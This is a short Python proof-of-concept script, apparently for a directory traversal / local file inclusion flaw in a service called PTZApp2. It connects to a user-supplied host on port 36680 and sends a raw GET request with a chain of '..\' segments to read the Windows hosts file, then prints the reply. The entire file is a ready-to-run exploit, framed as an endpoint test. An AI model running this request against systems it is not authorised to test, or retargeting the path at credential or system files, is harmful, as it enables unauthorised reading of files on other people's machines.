#!/usr/bin/python3

import subprocess as sp
import argparse
import socket

parser = argparse.ArgumentParser(
	prog = "PTZApp2 PoC",
	description = "Tests endpoint for directory traversal LFI vulnerability."
)

parser.add_argument("-i", "--ip", help="IP Address or hostname of endpoint to be tested", required=True)
parser.add_argument("-p", "--port", help="Port number of PTZApp2. Default port is 36680.", type=int, default=36680)
args = parser.parse_args()

IP = args.ip
Port = args.port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, Port))
s.send(b"GET ..\..\..\..\..\..\..\..\..\..\windows\system32\drivers\etc\hosts HTTP/1.1\r\nConnection: Close\r\n\r\n")
response = s.recv(1024)

print(response.decode())
